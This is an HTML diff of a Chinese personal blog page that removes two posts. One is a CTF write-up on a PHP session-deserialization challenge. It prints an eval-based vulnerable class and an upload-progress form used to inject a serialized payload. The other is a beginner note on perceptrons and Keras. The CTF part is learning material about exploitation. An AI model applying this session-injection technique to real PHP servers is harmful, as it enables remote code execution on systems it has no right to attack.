-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="百浪多息">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="prontosil">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/22/php-challenge9/" itemprop="url">php-challenge9</a></h1>
-        
-
-		
-
-        <div class="post-meta">
-         
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-22T22:50:01+08:00">
-                2019-07-22
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Post modified&#58;</span>
-              
-              <time title="Post modified" itemprop="dateModified" datetime="2019-07-22T22:59:18+08:00">
-                2019-07-22
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  334
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1>php-challenge 9</h1>
-<p>第一次接触到这个题目，被惊呆了</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $mdzz;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">	   <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">	   <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">   $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>初看源代码觉得并没有哪里可以让我反序列化注入的地方
-但是问题就出在第一句话：
-<code>ini_set('session.serialize_handler', 'php');</code></p>
-<blockquote>
-<p>关键点在于，如果脚本中设置的序列化处理器与php.ini设置的不同，或者两个脚本注册session使用的序列化处理器不同，那么就会出现安全问题。</p>
-</blockquote>
-<p>只需要加一个<code>|</code>就行</p>
-<p>这道<code>jarvisOj</code><a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">题目</a>就是这个原题
-这里还用到了另外一个漏洞：</p>
-<p>自己构造一个网页如下：</p>
-<p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>然后在上传一个文件，本地抓包，这里遇到了一点小问题，就是没办法抓到本地的包，可以通过直接对局域网的网络连接进行设置即可.</p>
-<p><img src="../assets/flag1_rw5qoyd8a.png" alt="flag1">
-此时就可以看到了</p>
-<p>接下来继续利用
-<img src="/assets/flag2_5a75jqie7.png" alt="flag2"></p>
-<p>tql。。。
-<a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">有趣的php反序列化总结</a>
-<a href="https://blog.szfszf.top/tech/code-audit-challenge-%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1%e7%bb%83%e4%b9%a0%e7%ac%94%e8%ae%b0/#challenge9" target="_blank" rel="noopener">szfszf</a>
-<a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO" target="_blank" rel="noopener">jarvisoj-web-writeup</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://prontosil.club/2019/07/21/deep-learning1/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="百浪多息">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="prontosil">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/21/deep-learning1/" itemprop="url">deep learning1</a></h1>
-        
-
-		
-
-        <div class="post-meta">
-         
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-21T16:07:58+08:00">
-                2019-07-21
-              </time>
-            
-
-            
-              <span class="post-meta-divider">|</span>
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-check-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Post modified&#58;</span>
-              
-              <time title="Post modified" itemprop="dateModified" datetime="2019-07-22T13:46:10+08:00">
-                2019-07-22
-              </time>
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/deep-learning/" itemprop="url" rel="index">
-                    <span itemprop="name">deep learning</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  532
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  2
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3>感知机补充</h3>
-<p>接着写</p>
-<p>感知机的训练中，老师还提供了一部份资料，比如训练出$y=2x$</p>
-<p>我们简要地看一下一次训练的结果：</p>
-<table>
-<thead>
-<tr>
-<th>bias</th>
-<th>x</th>
-<th>y</th>
-<th>w0</th>
-<th>w1</th>
-<th>yout</th>
-<th>y-yout</th>
-<th>adj0</th>
-<th>adj1</th>
-<th>alpha</th>
-<th>w0new</th>
-<th>w1new</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td>0.512</td>
-<td>1.023</td>
-<td>0.719</td>
-<td>0.403</td>
-<td>0.926</td>
-<td>0.977</td>
-<td>0.977</td>
-<td>0.500</td>
-<td>0.7</td>
-<td>0.788</td>
-<td>0.438</td>
-</tr>
-</tbody>
-</table>
-<p>进行很多次训练之后画出的图形：
-<img src="https://i.loli.net/2019/07/10/5d2533696b1e993944.png" alt=""></p>
-<p>预测的还是挺准确的</p>
-<h3>为什么需要bias？</h3>
-<p>概念上很好理解，bias就是将一个正比例函数变为了一次函数，这样不必每次都过原点，分类的准确性也就大大地提高了</p>
-<h2>多层感知机</h2>
-<p>一层的感知机是没办法处理异或问题的</p>
-<p>所以需要增加隐藏层
-就像下面这样：
-<img src="https://i.loli.net/2019/07/10/5d25354fec71179261.png" alt="">
-这样就可以做到了：</p>
-<p><img src="https://i.loli.net/2019/07/10/5d253567b050673436.png" alt=""></p>
-<p>感觉MLP的数学知识太过复杂了，暂时放着</p>
-<h2>keras</h2>
-<p>从栗子代码开始：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"></span><br><span class="line">model = Sequential()</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">使用add来堆叠模型</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">model.add(Dense(units=<span class="number">64</span>, activation=<span class="string">'relu'</span>, input_dim=<span class="number">100</span>))</span><br><span class="line">model.add(Dense(units=<span class="number">10</span>, activation=<span class="string">'softmax'</span>))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">使用compile来配置学习过程</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">model.compile(loss=<span class="string">'categorical_crossentropy'</span>,</span><br><span class="line">              optimizer=<span class="string">'sgd'</span>,</span><br><span class="line">              metrics=[<span class="string">'accuracy'</span>])</span><br><span class="line"><span class="comment"># x_train 和 y_train 是 Numpy 数组 -- 就像在 Scikit-Learn API 中一样。</span></span><br><span class="line">model.fit(x_train, y_train, epochs=<span class="number">5</span>, batch_size=<span class="number">32</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">评估模型</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">loss_and_metrics = model.evaluate(x_test, y_test, batch_size=<span class="number">128</span>)</span><br><span class="line">classes = model.predict(x_test, batch_size=<span class="number">128</span>)</span><br></pre></td></tr></table></figure></p>
-<h3>Sequential</h3>
-<h3>compile</h3>
-<p>在训练模型之前，需要配置学习过程，compile接收三个参数</p>
-<ul>
-<li>优化器optimizer</li>
-<li>损失函数loss</li>
-<li>评估标准metrics</li>
-</ul>
-<p>一个个来看</p>
-<ol>
-<li>
-<p>优化器
-可以先实例化一个优化器对象，然后将它传入<code>model.compile()</code>，或者可以通过</p>
-</li>
-<li>
-<p>损失函数</p>
-</li>
-</ol>
-<p>损失函数（或称目标函数、优化评分函数）是编译模型时所需的两个参数之一：
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.compile(loss=<span class="string">'mean_squared_error'</span>, optimizer=<span class="string">'sgd'</span>)</span><br></pre></td></tr></table></figure></p>
-<p>我们可以传递一个现有的损失函数名，或者一个tensorflow符号函数，有以下两个参数</p>
-<ul>
-<li>y_true: 真实标签.</li>
-<li>y_pred: 预测值,其shape与y_true相同</li>
-</ul>
-<p>可用的损失函数：
-mean_squared_error
-mean_absolute_error
-等</p>
-<h2>参考</h2>
-<p><a href="https://blog.csdn.net/xwd18280820053/article/details/70681750" target="_blank" rel="noopener">神经网络中w,b参数的作用（为何需要偏置b的解释）</a>
-<a href="https://blog.csdn.net/hy13684802853/article/details/78717475" target="_blank" rel="noopener">深度学习中偏移项bias的作用</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2716,7 +2717,7 @@ mean_absolute_error
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-count">42</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2738,7 +2739,7 @@ mean_absolute_error
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
